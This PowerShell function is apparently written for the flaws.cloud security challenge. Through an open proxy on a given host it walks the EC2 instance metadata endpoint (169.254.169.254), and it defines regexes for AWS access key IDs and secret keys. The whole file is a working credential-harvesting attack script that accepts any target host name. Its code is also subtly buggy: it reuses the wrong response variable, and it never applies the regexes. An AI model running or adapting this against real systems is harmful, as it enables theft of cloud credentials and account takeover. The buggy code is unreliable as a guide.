Function Get-AccessKeysInMetadata{
param(
    [parameter(Mandatory=$true)][string]$BucketName

)
    #$bucketname = "4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud"
        $magic = "/proxy/169.254.169.254/latest/meta-data/"
        $AccessKeyRegEx =  "(^|[^A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])"
        $SecretKeyRegEx = "(^|[^A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])"
        $url = "HTTP://" + $BucketName + $magic

$webpage = Invoke-WebRequest $url -UseBasicParsing

    if($webpage){
    $content = $webpage.Content.Split([environment]::NewLine)
    $content |% {
        $url2 = ($url + $_)
        $url2
        $webpage2 = Invoke-WebRequest $url2 -UseBasicParsing
        $content2 = $webpage2.Content.Split([environment]::NewLine)
            
            $content2 |% {
                $url3 = ($url2 + $_)
                $url3
                    try{$webpage3 = Invoke-WebRequest $url3 -UseBasicParsing
                    $content3 = $webpage2.Content.Split([environment]::NewLine)
                        
                    }
                    catch {
                    $content2
                }    
                        }
        }
    
    }
    



}